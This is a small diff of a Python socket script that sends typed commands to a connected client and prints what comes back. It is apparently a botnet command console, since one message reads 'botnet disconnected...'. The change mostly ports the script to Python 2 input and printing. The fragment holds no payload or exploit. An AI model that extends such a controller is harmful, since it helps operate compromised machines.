@@ -4,7 +4,7 @@ import threading
 
 def send(c):
     while True:
-        cmd = input() + '\n'
+        cmd = raw_input() 
         c.send(cmd.encode())
         print('\033[91msend: \033[00m' + cmd)
         if cmd == '':
@@ -15,7 +15,7 @@ def send(c):
 def recv(c):
     while True:
         data = c.recv(1024)
-        print('\033[92mrecv: \033[00m' + data.decode())
+        print('\033[92mrecv: \033[00m', data)
         if not data:
             print('botnet disconnected...')
             c.close()
